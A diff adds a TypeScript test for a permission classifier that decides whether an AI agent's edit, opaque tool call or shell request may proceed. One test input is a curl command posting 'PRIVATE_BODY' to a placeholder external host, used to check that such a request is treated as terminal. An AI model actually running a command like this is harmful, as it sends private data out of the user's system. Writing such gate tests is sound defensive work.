@@ -147,6 +147,28 @@ describe("native decision stage", () => {
     assert.equal(final.errorKind, "cancelled");
     assert.equal(llmCalls, 0);
   });
+  it("defers ordinary operation incompleteness to the fallback but keeps scope and body loss terminal", async () => {
+    let llmCalls = 0;
+    const editRequest = {
+      action: "edit", resources: ["src/a.ts"], projectDir: "/repo",
+      operation: { tool: "edit", access: "write" as const, targets: ["/repo/src/a.ts"],
+        arguments: { filePath: "src/a.ts" }, complete: false },
+    };
+    const final = await runClassifiers([{ type: "decision", ...options }, { type: "llm", model: "test-provider/fallback" }],
+      editRequest, { band: "high", reason: "review" }, {
+        decision: async (stage) => decisionStage(
+          context(async () => { throw new Error("decision generation must not run"); }), stage, editRequest),
+        llm: async () => { llmCalls++; return { decision: "allow", reason: "fallback reviewed partial evidence" }; },
+      });
+    assert.equal(llmCalls, 1);
+    assert.equal(final.decision, "allow");
+    const opaque = await decisionStage(context(async () => { throw new Error("must not call"); }), options,
+      { action: "mcp__opaque", resources: ["*"], operation: { access: "unknown", complete: false } });
+    assert.equal(opaque.terminal, true);
+    const body = await decisionStage(context(async () => { throw new Error("must not call"); }), options,
+      { action: "shell", resources: ["curl https://example.invalid -d PRIVATE_BODY"] });
+    assert.equal(body.terminal, true);
+  });
   it("passes cancellation through to host generation", async () => {
     const controller = new AbortController();
     let bounded: AbortSignal | undefined;
